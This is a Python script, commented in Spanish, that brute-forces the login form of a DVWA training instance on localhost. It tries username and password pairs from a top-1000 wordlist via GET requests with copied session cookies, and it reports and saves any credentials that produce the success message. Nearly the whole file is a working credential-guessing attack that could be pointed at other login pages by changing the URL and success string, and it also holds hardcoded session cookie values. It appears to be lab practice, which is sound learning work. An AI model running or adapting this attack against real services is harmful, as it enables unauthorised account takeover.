#!/usr/bin/env python3
"""
Brute-force sencillo (usa GET) sobre DVWA vulnerabilities/brute/
Muestra en terminal todas las credenciales correctas y las guarda en valid_combos.txt.
"""

import requests
import time
import sys


USERS_FILE = "Pwdb_top-1000.txt"    # fichero con usuarios (uno por línea)
PASSES_FILE = "Pwdb_top-1000.txt"   # fichero con contraseñas (uno por línea)
OUTPUT_FILE = "valid_combos.txt"
LOGIN_URL = "http://localhost:8000/vulnerabilities/brute/"
SUCCESS_MESSAGE = "Welcome to the password protected area"  #
DELAY = 0.03  

# Cookies y headers copiados (ajusta PHPSESSID si cambia)
COOKIES = {
    "pma_lang": "es",
    "pmaUser-1": "o4PpChpIYAayOL25ybAiimm%2B9sadBgxUM6FR1pPd7UFQRyFHV1y3JQlfJDg%3D",
    "phpMyAdmin": "22162dfc29b822a838ff99b3d46b2aba",
    "PHPSESSID": "9tic44pce0bvh1tr3kqsk7bcc6",
    "security": "low"
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Connection": "keep-alive",
    "Referer": "http://localhost:8000/vulnerabilities/brute/",
    "Upgrade-Insecure-Requests": "1"
}

def run_bruteforce(user_list_path, password_list_path):
    print(f"[*] Iniciando ataque contra {LOGIN_URL}")
    total_attempts = 0
    found = []

    try:
        with open(user_list_path, "r", encoding="utf-8", errors="ignore") as uf:
            users = [u.strip() for u in uf if u.strip()]
    except FileNotFoundError:
        print(f"[!] Error: no se encontró el archivo de usuarios: {user_list_path}")
        return False

    try:
        with open(password_list_path, "r", encoding="utf-8", errors="ignore") as pf:
            passwords = [p.strip() for p in pf if p.strip()]
    except FileNotFoundError:
        print(f"[!] Error: no se encontró el archivo de contraseñas: {password_list_path}")
        return False

    if not users or not passwords:
        print("[!] Error: archivos vacíos.")
        return False

    s = requests.Session()
    s.headers.update(HEADERS)
    s.cookies.update(COOKIES)

    # limpiar archivo de salida previo
    open(OUTPUT_FILE, "w").close()

    start = time.time()
    try:
        for ui, user in enumerate(users, start=1):
            print(f"\n[*] Probando usuario {ui}/{len(users)}: {user}")
            for pi, pwd in enumerate(passwords, start=1):
                payload = {"username": user, "password": pwd, "Login": "Login"}
                try:
                    r = s.get(LOGIN_URL, params=payload, timeout=15, allow_redirects=True)
                except requests.RequestException as e:
                    print(f"\n[!] Error request {user}:{pwd} -> {e}")
                    time.sleep(DELAY)
                    continue

                total_attempts += 1
                body = r.text or ""
                length = len(body)

                # comprobación simple de éxito por mensaje en página
                if SUCCESS_MESSAGE in body:
                    print("\n\n[+] ¡CREDENCIAL VÁLIDA ENCONTRADA!")
                    print(f"    Usuario   : {user}")
                    print(f"    Contraseña: {pwd}")
                    print(f"    status    : {r.status_code}  longitud={length}")
                    found.append((user, pwd))
                    with open(OUTPUT_FILE, "a", encoding="utf-8") as outf:
                        outf.write(f"{user}:{pwd} status={r.status_code} len={length}\n")
                    # NO retornamos; seguimos buscando más (si quisieras parar, descomenta la siguiente línea)
                    # return True
                # mostrar progreso sencillo (se sobrescribe)
                sys.stdout.write(f"\rIntentos: {total_attempts} | Probando {user}:{pwd} -> status={r.status_code} len={length} ")
                sys.stdout.flush()

                if DELAY:
                    time.sleep(DELAY)

    except KeyboardInterrupt:
        print("\n[!] Interrumpido por usuario (Ctrl+C).")

    elapsed = time.time() - start
    print(f"\n\n[*] Ataque finalizado. Tiempo: {elapsed:.2f}s intentos: {total_attempts}")

    if found:
        print(f"[*] Credenciales válidas encontradas ({len(found)}):")
        for u,p in found:
            print(f"  - {u}:{p}")
        print(f"[*] También guardadas en: {OUTPUT_FILE}")
        return True
    else:
        print("[-] No se encontraron credenciales válidas.")
        return False

if __name__ == "__main__":
    run_bruteforce(USERS_FILE, PASSES_FILE)
